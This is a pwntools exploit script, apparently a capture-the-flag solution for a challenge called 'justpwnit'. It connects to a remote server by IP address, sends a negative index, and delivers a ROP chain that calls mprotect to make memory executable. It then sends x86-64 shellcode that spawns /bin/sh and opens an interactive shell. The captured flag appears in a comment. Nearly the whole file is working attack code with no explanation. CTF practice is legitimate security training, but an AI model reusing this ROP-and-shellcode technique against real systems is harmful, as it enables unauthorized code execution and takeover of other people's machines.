from pwn import *

context(os='linux', arch='amd64')
context.log_level = 'debug'

p = remote('168.119.108.148', 11010)
#p = process('./justpwnit')
binary = ELF('./justpwnit', checksec=False)

#context.gdbinit = "~/.gdbinit"
#gdb.attach(p, 'b *0x4080ea')

buff = "A"*0x8
pop_rdi = p64(0x401b0d)
start = p64(0x40d000)
length = p64(0x1000)
max_length = p64(0x100)
pop_rsi = p64(0x4019a3)
pop_rdx = p64(0x403d23)
rwx = p64(0x7)
mprotect = p64(0x4080ea)
syscall = p64(0x403888)
jmp_rax = p64(0x40109f)
heap_addr = p64(0x40d500)
pop_rcx = p64(0x40801a)
syscall = p64(0x403888)

shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

exp = buff
exp += pop_rdi
exp += start
exp += pop_rsi
exp += length
exp += pop_rdx
exp += rwx
exp += mprotect
exp += pop_rsi
exp += heap_addr
exp += pop_rdx
exp += max_length
exp += syscall
exp += heap_addr

p.sendlineafter("Index:", "-2")
p.sendlineafter("Data:", exp)
p.sendline(shellcode)
p.interactive()

#flag: ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
